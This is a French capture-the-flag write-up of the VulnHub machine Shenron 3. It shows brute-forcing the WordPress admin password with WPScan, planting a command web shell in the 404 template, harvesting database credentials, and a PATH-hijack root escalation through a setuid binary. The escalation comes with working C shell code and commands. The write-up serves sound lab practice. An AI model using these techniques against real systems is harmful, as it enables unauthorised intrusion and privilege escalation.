# Solution du CTF Shenron 3 de VulnHub

Dernier épisode (à ce jour) de la série, [shenron: 3](https://vulnhub.com/entry/shenron-3,682/) est un CTF téléchargeable sur VulnHub.

```
Nmap scan report for 192.168.56.62
Host is up (0.00026s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: shenron-3 | Just another WordPress site
|_http-generator: WordPress 4.6
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

Une énumération à l'aide de `WPscan` sur le Wordpress ne ressort aucune information intéressante.

## Le bon, la brute et le webshell

Une énumération web ne trouvant aucun fichier particulier, je me décide de bruteforcer le compte admin du Wordpress :

```shellsession
$ docker run -v /tools/wordlists:/wordlists --add-host shenron:192.168.56.62 -it --rm wpscanteam/wpscan --url http://shenron/ -U admin -P /wordlists/rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

--- snip ---

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / iloverockyou                                                                                                                                                                                  
Trying admin / ilovephil Time: 00:04:51 <                                                                                                                               > (31535 / 14375925)  0.21%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: iloverockyou
```

Ca a pris un bon paquet de minutes mais ce fut utile :)

Une fois connecté sur l'interface du Wordpress je vais dans *Appeareance > Editor* puis j'édite le template pour les erreurs 404.

Je rajoute mon code dedans, il ne reste plus qu'à demander un article de blog invalide avec ma commande en paramètre:

`http://shenron/index.php/2048?cmd=id` qui retourne `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

Une fois récupéré mon shell je commence par récupérer les identifiants de BDD dans `wp-config.php` :

```php
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'wordpress');

/** MySQL database password */
define('DB_PASSWORD', 'Wordpress@123');
```

Il n'y a qu'un seul utilisateur dans la table `wp_users` et comme on connait le mot de passe, ça n'a aucune utilité.

Après avoir fouillé rapidement je ne remarque rien de particulier sur le système.

Je tente le mot de passe `iloverockyou` pour l'utilisateur `shenron` et bingo, ça fonctionne !

## A l'ancienne

Il y a deux fichiers notables dans le dossier personnel de l'utilisateur :

```
-rwx------ 1 shenron shenron    33 Apr 16  2021 local.txt
-rwsr-xr-x 1 root    root    16712 Apr 15  2021 network
```

Le premier est bien sûr le flag (`a57e2ff676cd040d58b375f686c7cedc`)  et l'autre est un binaire setuid root qui semble appeller `netstat` (extraits choisis du hexdump) :

```
00000400  00 00 00 00 00 00 00 00  00 73 65 74 75 69 64 00  |.........setuid.|
00000410  73 79 73 74 65 6d 00 5f  5f 63 78 61 5f 66 69 6e  |system.__cxa_fin|
00000420  61 6c 69 7a 65 00 73 65  74 67 69 64 00 5f 5f 6c  |alize.setgid.__l|
00000430  69 62 63 5f 73 74 61 72  74 5f 6d 61 69 6e 00 6c  |ibc_start_main.l|
00000440  69 62 63 2e 73 6f 2e 36  00 47 4c 49 42 43 5f 32  |ibc.so.6.GLIBC_2|
00000450  2e 32 2e 35 00 5f 49 54  4d 5f 64 65 72 65 67 69  |.2.5._ITM_deregi|
00000460  73 74 65 72 54 4d 43 6c  6f 6e 65 54 61 62 6c 65  |sterTMCloneTable|
00000470  00 5f 5f 67 6d 6f 6e 5f  73 74 61 72 74 5f 5f 00  |.__gmon_start__.|
00000480  5f 49 54 4d 5f 72 65 67  69 73 74 65 72 54 4d 43  |_ITM_registerTMC|
00000490  6c 6f 6e 65 54 61 62 6c  65 00 00 00 00 00 02 00  |loneTable.......|

00002000  01 00 02 00 6e 65 74 73  74 61 74 20 2d 6e 6c 74  |....netstat -nlt|
00002010  75 70 00 00 01 1b 03 3b  38 00 00 00 06 00 00 00  |up.....;8.......|
```

On est sur une faille classique de PATH relatif. La problématique c'est que `netstat` est appelé avec des options spécifiques donc si on fait appeller `bash` à la place de `netstat`, `bash` quittera en indiquant qu'une option est invalide.

On doit donc écrire notre propre code qui nous donnera un shell sans tenir compte des options :

```c
#include <unistd.h>
#include <stdlib.h>

int main(char *argv[]) {
  setreuid(0, 0);
  setregid(0, 0);
  system("/bin/dash -p");
  return 0;
}
```

Je le compile en static depuis ma machine car `gcc` n'est pas sur la VM puis je le dépose dans `/tmp`.

```shellsession
shenron@shenron:~$ cp /tmp/gotroot netstat
shenron@shenron:~$ export PATH=.:$PATH
shenron@shenron:~$ ./network
# id
uid=0(root) gid=0(root) groups=0(root),1000(shenron)
# cd /root
# ls
root.txt
# cat root.txt
                                                               
  mmmm  #                                                 mmmm 
 #"   " # mm    mmm   m mm    m mm   mmm   m mm          "   "#
 "#mmm  #"  #  #"  #  #"  #   #"  " #" "#  #"  #           mmm"
     "# #   #  #""""  #   #   #     #   #  #   #   """       "#
 "mmm#" #   #  "#mm"  #   #   #     "#m#"  #   #         "mmm#"
                                                               
Your Root Flag Is Here :- a7ed78963dffd9450a34fcc4a0eecb98

Keep Supporting Me. ;-)
```

*Publié le 18 novembre 2022*
